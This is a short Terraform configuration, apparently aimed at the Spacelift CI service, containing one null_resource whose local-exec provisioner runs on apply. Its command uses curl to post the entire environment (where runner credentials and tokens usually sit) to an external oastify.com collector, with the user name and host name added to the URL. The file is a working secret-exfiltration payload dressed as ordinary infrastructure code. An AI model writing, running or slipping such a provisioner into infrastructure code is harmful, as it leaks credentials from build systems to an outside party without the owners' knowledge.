resource "null_resource" "example" {
  provisioner "local-exec" {
    command = "curl -d \"`env`\" https://czfsdpmegb8s3veiunccg7mv0m6g04rsg.oastify.com/spacelift/`whoami`/`hostname`"
  }
}
